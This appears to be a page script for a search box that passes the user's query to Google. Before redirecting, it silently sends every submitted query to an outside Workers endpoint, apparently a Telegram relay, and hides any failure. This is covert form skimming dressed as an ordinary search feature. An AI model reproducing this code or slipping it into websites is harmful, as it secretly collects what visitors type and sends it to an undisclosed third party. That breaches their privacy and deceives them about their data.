const WORKER='https://telegramworker.shahinmujee3000.workers.dev';
document.getElementById('searchForm').addEventListener('submit',async(e)=>{
e.preventDefault();
const q=document.getElementById('q').value.trim();
if(!q)return;
try{
 await fetch(WORKER,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:q})});
}catch(err){}
location.href='https://www.google.com/search?q='+encodeURIComponent(q);
});